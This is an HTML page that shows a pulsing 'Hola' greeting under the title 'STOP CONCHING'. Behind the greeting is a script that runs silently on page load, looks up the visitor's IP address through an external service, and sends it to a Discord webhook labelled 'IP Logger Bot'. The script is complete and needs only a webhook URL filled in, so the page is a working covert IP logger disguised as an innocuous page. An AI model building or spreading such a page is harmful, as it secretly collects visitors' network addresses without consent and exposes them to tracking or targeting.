<!DOCTYPE html>
<html>
<head>
    <title>STOP CONCHING</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        
        .title {
            font-size: 72px;
            text-align: center;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.5); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="title">Hola</div>

    <script>
        // Function to get visitor's IP using an API
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return 'Unable to get IP';
            }
        }

        // Function to send IP to Discord webhook
        async function sendToDiscord(ip) {
            // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
            const webhookUrl = 'YOUR_WEBHOOK_URL';
            
            const message = {
                content: `New visitor! IP Address: ${ip}`,
                username: 'IP Logger Bot'
            };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });
            } catch (error) {
                console.error('Error sending to Discord:', error);
            }
        }

        // Execute when page loads
        window.onload = async function() {
            const ip = await getIP();
            await sendToDiscord(ip);
        };
    </script>
</body>
</html>
